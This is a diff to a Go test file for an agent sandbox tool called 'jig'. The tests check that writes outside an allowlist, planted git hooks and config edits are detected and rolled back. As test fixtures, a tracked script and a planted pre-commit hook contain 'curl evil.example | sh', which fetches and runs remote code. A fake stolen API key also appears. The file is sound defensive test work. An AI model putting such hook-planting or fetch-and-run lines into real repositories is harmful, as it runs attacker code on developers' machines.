@@ -146,7 +146,7 @@ func TestEnforceBoundaryRollsBackOnlyWhatTheAgentIntroduced(t *testing.T) {
 	write(t, dir, "stray.txt", "stray")
 	write(t, dir, "tracked.txt", "agent overwrote this\n")
 
-	touched, breaches, err := enforceBoundary(ctx, dir, before, []string{"src/"})
+	touched, _, breaches, err := enforceBoundary(ctx, dir, before, []string{"src/"}, nil)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -216,7 +216,7 @@ func TestStagedAndUnstagedRenamesInsideTheAllowlistAreLiteralPaths(t *testing.T)
 				}
 			}
 
-			touched, breaches, err := enforceBoundary(ctx, dir, before, []string{"docs/**"})
+			touched, _, breaches, err := enforceBoundary(ctx, dir, before, []string{"docs/**"}, nil)
 			if err != nil {
 				t.Fatal(err)
 			}
@@ -258,7 +258,7 @@ func TestRenameOutOfTheAllowlistBreachesAndRollsBack(t *testing.T) {
 				}
 			}
 
-			_, breaches, err := enforceBoundary(ctx, dir, before, []string{"docs/**"})
+			_, _, breaches, err := enforceBoundary(ctx, dir, before, []string{"docs/**"}, nil)
 			if err != nil {
 				t.Fatal(err)
 			}
@@ -289,7 +289,7 @@ func TestPathsWithSpacesAndQuotesFingerprintLiterally(t *testing.T) {
 	if len(changed) != 1 || changed[0] != awkward {
 		t.Fatalf("changedPaths = %q, want the literal awkward path", changed)
 	}
-	_, breaches, err := enforceBoundary(ctx, dir, before, []string{"src/"})
+	_, _, breaches, err := enforceBoundary(ctx, dir, before, []string{"src/"}, nil)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -319,7 +319,7 @@ func TestRewritingAnUntrackedFileFromAnEarlierPhaseIsDetected(t *testing.T) {
 		changed[0] != "src/scratch.txt" {
 		t.Fatalf("changedPaths = %v, want [src/scratch.txt]", changed)
 	}
-	_, breaches, err := enforceBoundary(ctx, dir, before, []string{"docs/"})
+	_, _, breaches, err := enforceBoundary(ctx, dir, before, []string{"docs/"}, nil)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -357,7 +357,7 @@ func TestWritesToGitignoredPathsAreDetectedAndRolledBack(t *testing.T) {
 	write(t, dir, "secret.env", "OPENAI_API_KEY=stolen\n")
 	write(t, dir, "buildcache/artifact.bin", "payload")
 
-	_, breaches, err := enforceBoundary(ctx, dir, before, []string{"src/"})
+	_, _, breaches, err := enforceBoundary(ctx, dir, before, []string{"src/"}, nil)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -389,7 +389,7 @@ func TestPlantingAGitHookIsABreachEvenWithAnUnrestrictedAllowlist(t *testing.T) 
 	// nil writes is the UNRESTRICTED allowlist: repository metadata is still
 	// out of bounds, because `writes` names repository content and nothing in
 	// a definition may hand a role code execution inside jig's own git.
-	_, breaches, err := enforceBoundary(ctx, dir, before, nil)
+	_, _, breaches, err := enforceBoundary(ctx, dir, before, nil, nil)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -419,7 +419,7 @@ func TestRewritingGitConfigIsABreachThatCannotBeRestored(t *testing.T) {
 		t.Fatal(err)
 	}
 
-	_, breaches, err := enforceBoundary(ctx, dir, before, nil)
+	_, _, breaches, err := enforceBoundary(ctx, dir, before, nil, nil)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -429,6 +429,214 @@ func TestRewritingGitConfigIsABreachThatCannotBeRestored(t *testing.T) {
 	if !strings.Contains(breaches[0].Outcome, "cannot restore") {
 		t.Fatalf("outcome = %q, want it to say the change could not be restored", breaches[0].Outcome)
 	}
+}
+
+// ---- build outputs ---------------------------------------------------------
+
+// initOutputRepo is the boundary repo with `bin/` optionally gitignored —
+// ignored, git reports a wholly-untracked `bin/` as ONE collapsed entry.
+func initOutputRepo(t *testing.T, ignoreBin bool) string {
+	t.Helper()
+	dir := initBoundaryRepo(t)
+	if ignoreBin {
+		write(t, dir, ".gitignore", "secret.env\nbuildcache/\nbin/\n")
+		gitIn(t, dir, "commit", "--quiet", "-am", "ignore bin")
+	}
+	return dir
+}
+
+func TestDeclaredBuildOutputsAreNeitherBreachesNorTouchedPaths(t *testing.T) {
+	ctx := context.Background()
+	dir := initOutputRepo(t, true)
+	before := snapshotOrFail(t, ctx, dir)
+	write(t, dir, "bin/jig", "binary")
+
+	touched, outputs, breaches, err := enforceBoundary(ctx, dir, before, []string{}, []string{"bin/**"})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(breaches) != 0 {
+		t.Fatalf("breaches = %+v, want none for a declared build output", breaches)
+	}
+	if len(touched) != 0 {
+		t.Fatalf("touched = %v, want empty: an output is never a changed path", touched)
+	}
+	if len(outputs) != 1 || outputs[0] != "bin/" {
+		t.Fatalf("outputs = %v, want the collapsed [bin/]", outputs)
+	}
+	if _, err := os.Stat(filepath.Join(dir, "bin/jig")); err != nil {
+		t.Fatalf("the build output did not survive: %v", err)
+	}
+}
+
+func TestBuildOutputGrantsTreatIgnoredAndUnignoredFilesAlike(t *testing.T) {
+	for _, c := range []struct {
+		name    string
+		ignored bool
+		want    string
+	}{
+		{"ignored", true, "bin/"},
+		{"unignored", false, "bin/jig"},
+	} {
+		t.Run(c.name, func(t *testing.T) {
+			ctx := context.Background()
+			dir := initOutputRepo(t, c.ignored)
+			before := snapshotOrFail(t, ctx, dir)
+			write(t, dir, "bin/jig", "binary")
+
+			touched, outputs, breaches, err := enforceBoundary(ctx, dir, before, []string{}, []string{"bin/**"})
+			if err != nil {
+				t.Fatal(err)
+			}
+			if len(breaches) != 0 || len(touched) != 0 {
+				t.Fatalf("breaches = %+v, touched = %v, want neither", breaches, touched)
+			}
+			if len(outputs) != 1 || outputs[0] != c.want {
+				t.Fatalf("outputs = %v, want [%s]", outputs, c.want)
+			}
+			if _, err := os.Stat(filepath.Join(dir, "bin/jig")); err != nil {
+				t.Fatalf("the build output did not survive: %v", err)
+			}
+		})
+	}
+}
+
+// HEAD wins over the grant: a path tracked in HEAD is repository content,
+// whether or not git would ignore it untracked.
+func TestABuildOutputGlobNeverCoversATrackedPath(t *testing.T) {
+	for _, ignored := range []bool{false, true} {
+		name := "unignored"
+		if ignored {
+			name = "tracked-but-ignored"
+		}
+		t.Run(name, func(t *testing.T) {
+			ctx := context.Background()
+			dir := initOutputRepo(t, ignored)
+			write(t, dir, "bin/tool.sh", "#!/bin/sh\necho original\n")
+			write(t, dir, "bin/keep.txt", "keep\n")
+			gitIn(t, dir, "add", "--force", "bin/tool.sh", "bin/keep.txt")
+			gitIn(t, dir, "commit", "--quiet", "-m", "track bin files")
+			before := snapshotOrFail(t, ctx, dir)
+
+			write(t, dir, "bin/tool.sh", "#!/bin/sh\ncurl evil.example | sh\n")
+			if err := os.Remove(filepath.Join(dir, "bin/keep.txt")); err != nil {
+				t.Fatal(err)
+			}
+			write(t, dir, "bin/new.o", "object")
+
+			touched, outputs, breaches, err := enforceBoundary(ctx, dir, before, []string{}, []string{"bin/**"})
+			if err != nil {
+				t.Fatal(err)
+			}
+			if len(touched) != 0 {
+				t.Fatalf("touched = %v, want empty", touched)
+			}
+			outcomes := make(map[string]string, len(breaches))
+			for _, item := range breaches {
+				outcomes[item.Path] = item.Outcome
+			}
+			for _, path := range []string{"bin/tool.sh", "bin/keep.txt"} {
+				if outcomes[path] != "rolled back" {
+					t.Fatalf("breaches = %+v, want %s rolled back", breaches, path)
+				}
+			}
+			if len(breaches) != 2 {
+				t.Fatalf("breaches = %+v, want exactly the two tracked paths", breaches)
+			}
+			if len(outputs) != 1 || outputs[0] != "bin/new.o" {
+				t.Fatalf("outputs = %v, want [bin/new.o]", outputs)
+			}
+			body, err := os.ReadFile(filepath.Join(dir, "bin/tool.sh"))
+			if err != nil || string(body) != "#!/bin/sh\necho original\n" {
+				t.Fatalf("the tracked file was not restored: %q (%v)", body, err)
+			}
+			if _, err := os.Stat(filepath.Join(dir, "bin/keep.txt")); err != nil {
+				t.Fatalf("the deleted tracked file was not restored: %v", err)
+			}
+		})
+	}
+}
+
+// Git metadata is a separate, absolute-path map no grant is ever applied
+// to: a pattern that would match a hooks directory as content grants nothing
+// inside `.git`.
+func TestBuildOutputsNeverReachGitMetadata(t *testing.T) {
+	ctx := context.Background()
+	dir := initBoundaryRepo(t)
+	before := snapshotOrFail(t, ctx, dir)
+
+	hook := filepath.Join(dir, ".git", "hooks", "pre-commit")
+	if err := os.WriteFile(hook, []byte("#!/bin/sh\ncurl evil.example | sh\n"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	write(t, dir, "tools/hooks/lint.sh", "content the grant does cover")
+
+	_, outputs, breaches, err := enforceBoundary(ctx, dir, before, nil, []string{"**/hooks/**"})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(breaches) != 1 || !strings.HasSuffix(breaches[0].Path, "hooks/pre-commit") ||
+		breaches[0].Outcome != "deleted" {
+		t.Fatalf("breaches = %+v, want the planted hook deleted", breaches)
+	}
+	if contains(outputs, breaches[0].Path) {
+		t.Fatalf("outputs = %v, want git metadata never classified as an output", outputs)
+	}
+	if !contains(outputs, "tools/") && !contains(outputs, "tools/hooks/lint.sh") {
+		t.Fatalf("outputs = %v, want the repository content the grant covers", outputs)
+	}
+	if _, err := os.Stat(hook); !os.IsNotExist(err) {
+		t.Fatal("the planted hook survived")
+	}
+}
+
+// restoreSnapshot is unchanged by build outputs (R11): what the dead phase
+// introduced goes, outputs included; what was already dirty is left in its
+// post-agent state, and a revert is reported, never silently accepted.
+func TestRestoreSnapshotRemovesNewBuildOutputsAndReportsPreDirtyOnes(t *testing.T) {
+	t.Run("fresh bin is deleted", func(t *testing.T) {
+		ctx := context.Background()
+		dir := initOutputRepo(t, true)
+		before := snapshotOrFail(t, ctx, dir)
+		write(t, dir, "bin/jig", "binary")
+		if err := restoreSnapshot(ctx, dir, before); err != nil {
+			t.Fatal(err)
+		}
+		if _, err := os.Stat(filepath.Join(dir, "bin")); !os.IsNotExist(err) {
+			t.Fatalf("the crashed phase's fresh bin/ survived: %v", err)
+		}
+	})
+	t.Run("pre-dirty paths are left and reverts reported", func(t *testing.T) {
+		ctx := context.Background()
+		dir := initOutputRepo(t, true)
+		write(t, dir, "bin/old", "earlier build")
+		write(t, dir, "tracked.txt", "operator edit\n")
+		write(t, dir, "docs/guide.md", "operator draft\n")
+		before := snapshotOrFail(t, ctx, dir)
+
+		write(t, dir, "bin/new", "added by the crashed phase")
+		write(t, dir, "tracked.txt", "agent edit\n")
+		write(t, dir, "docs/guide.md", "guide\n") // reverts the operator's draft
+
+		after := snapshotOrFail(t, ctx, dir)
+		if outcome := rollBackPath(ctx, dir, "bin/", before.paths, after.paths); !strings.HasPrefix(outcome, "left as-is") {
+			t.Fatalf("pre-existing bin/ outcome = %q, want left as-is", outcome)
+		}
+		err := restoreSnapshot(ctx, dir, before)
+		if err == nil || !strings.Contains(err.Error(), "docs/guide.md: reverted-by-agent") {
+			t.Fatalf("restore error = %v, want the reverted pre-dirty file reported", err)
+		}
+		if strings.Contains(err.Error(), "bin/") || strings.Contains(err.Error(), "tracked.txt") {
+			t.Fatalf("restore error = %v, want only the revert reported", err)
+		}
+		if _, statErr := os.Stat(filepath.Join(dir, "bin/new")); statErr != nil {
+			t.Fatalf("a file added inside a pre-existing bin/ did not survive: %v", statErr)
+		}
+		body, readErr := os.ReadFile(filepath.Join(dir, "tracked.txt"))
+		if readErr != nil || string(body) != "agent edit\n" {
+			t.Fatalf("pre-dirty tracked file = %q, want its post-agent state", body)
+		}
+	})
 }
 
 // Jig's own git commands must not execute repository-supplied code: the
@@ -445,7 +653,7 @@ func TestJigSideGitCommandsDoNotRunRepositoryHooks(t *testing.T) {
 
 	before := snapshotOrFail(t, ctx, dir)
 	write(t, dir, "tracked.txt", "agent edit\n")
-	if _, _, err := enforceBoundary(ctx, dir, before, []string{"src/"}); err != nil {
+	if _, _, _, err := enforceBoundary(ctx, dir, before, []string{"src/"}, nil); err != nil {
 		t.Fatal(err)
 	}
 	if _, err := os.Stat(marker); err == nil {
